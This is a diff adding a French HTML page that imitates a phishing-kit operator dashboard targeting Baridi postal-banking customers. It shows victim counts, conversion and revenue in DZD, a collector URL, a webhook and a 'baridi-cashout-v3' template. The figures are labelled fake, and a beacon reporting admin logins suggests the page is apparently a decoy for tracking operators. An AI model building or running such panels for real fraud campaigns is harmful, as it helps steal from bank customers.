@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#14315E">
+  <title>BaridiVerify - Tableau de bord</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: #EDF0F4;
+      background-image:
+        linear-gradient(135deg, rgba(20,49,94,0.03) 0%, transparent 50%),
+        linear-gradient(45deg, rgba(20,49,94,0.02) 0%, transparent 50%);
+      color: #333;
+      -webkit-font-smoothing: antialiased;
+    }
+    .status-bar {
+      height: 24px;
+      background: #14315E;
+      color: #fff;
+      font-size: 12px;
+      padding: 0 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .app-bar {
+      height: 56px;
+      background: #14315E;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      justify-content: space-between;
+    }
+    .app-bar .back-btn {
+      width: 40px; height: 40px; border: none; background: transparent;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      color: #fff; cursor: pointer;
+    }
+    .app-bar .title {
+      font-size: 16px; font-weight: 600; color: #fff; text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+    .app-bar .actions { display: flex; gap: 4px; }
+    .icon-btn {
+      width: 40px; height: 40px; border: none; background: transparent;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      color: #fff; cursor: pointer;
+    }
+    .icon-btn:active { background: rgba(255,255,255,0.1); }
+    .main { flex: 1; padding: 24px 16px 32px; max-width: 700px; margin: 0 auto; }
+    .card {
+      background: #fff;
+      border: 1px solid #E8ECEF;
+      border-radius: 6px;
+      padding: 20px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.04);
+      margin-bottom: 16px;
+    }
+    .card-title {
+      font-size: 13px; font-weight: 600; color: #1E4F9F;
+      text-transform: uppercase; letter-spacing: 0.4px;
+      margin-bottom: 16px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #E8ECEF;
+    }
+    .stat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+    .stat-item {
+      background: #EDF0F4;
+      border: 1px solid #D0D5DD;
+      border-radius: 6px;
+      padding: 16px;
+      text-align: center;
+    }
+    .stat-label {
+      font-size: 11px; font-weight: 600; color: #1E4F9F;
+      text-transform: uppercase; letter-spacing: 0.3px;
+      margin-bottom: 4px;
+    }
+    .stat-value {
+      font-size: 22px; font-weight: 700; color: #14315E;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+    }
+    .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #E8ECEF; }
+    .info-row:last-child { border-bottom: none; }
+    .info-label { font-size: 13px; color: #1E4F9F; font-weight: 500; }
+    .info-value { font-size: 13px; color: #333; font-family: 'SF Mono', 'Fira Code', monospace; word-break: break-all; }
+    .btn-row { display: flex; justify-content: flex-end; margin-top: 8px; }
+    .btn {
+      min-width: 180px;
+      height: 48px;
+      background: #14315E;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+    }
+    .btn:active { background: #0D2448; }
+  </style>
+</head>
+<body>
+  <header class="app-bar">
+    <button class="back-btn" aria-label="Retour"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg></button>
+    <span class="title">TABLEAU DE BORD</span>
+    <div class="actions">
+      <button class="icon-btn" aria-label="Actualiser"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg></button>
+    </div>
+  </header>
+
+  <main class="main">
+    <div class="card">
+      <div class="card-title">Statistiques de campagne</div>
+      <div class="stat-grid">
+        <div class="stat-item">
+          <div class="stat-label">VICTIMES</div>
+          <div class="stat-value" id="total-victims">0</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">CONVERSION</div>
+          <div class="stat-value" id="conversion-rate">--%</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-label">REVENUS EST.</div>
+          <div class="stat-value" id="revenue-est">-- DZD</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Configuration</div>
+      <div class="info-row">
+        <span class="info-label">URL DE LA PAGE</span>
+        <span class="info-value" id="landing-url">--</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">TEMPLATE</span>
+        <span class="info-value">baridi-cashout-v3</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">COLLECTEUR</span>
+        <span class="info-value" id="collector-url">--</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">WEBHOOK</span>
+        <span class="info-value" id="webhook-url">--</span>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Actions</div>
+      <div class="btn-row">
+        <a href="#" class="btn" id="open-page" target="_blank">Ouvrir la page</a>
+      </div>
+    </div>
+  </main>
+
+  <script src="admin-beacon.js"></script>
+  <script>
+    // --- Fake analytics (ghost data) ---
+    let victims = 0;
+    const increment = setInterval(() => {
+      if (Math.random() < 0.3) { victims += Math.floor(Math.random() * 2) + 1; }
+      document.getElementById('total-victims').textContent = victims;
+      document.getElementById('conversion-rate').textContent = (Math.random() * 40 + 35).toFixed(1) + '%';
+      document.getElementById('revenue-est').textContent = (victims * (15000 + Math.random() * 5000)).toLocaleString() + ' DZD';
+    }, 5000);
+
+    // Populate from URL params
+    const params = new URLSearchParams(window.location.search);
+    document.getElementById('landing-url').textContent = params.get('page') || 'https://phisher-host.local/baridi';
+    document.getElementById('collector-url').textContent = window.KIT_COLLECTOR || '/submit';
+    document.getElementById('webhook-url').textContent = params.get('webhook') || 'non configuré';
+    document.getElementById('open-page').href = params.get('page') || '#';
+
+    // Admin beacon fires on dashboard load
+    window.fdjBeacon && window.fdjBeacon({
+      event: 'admin_login',
+      ts: Date.now()
+    });
+  </script>
+</body>
+</html>
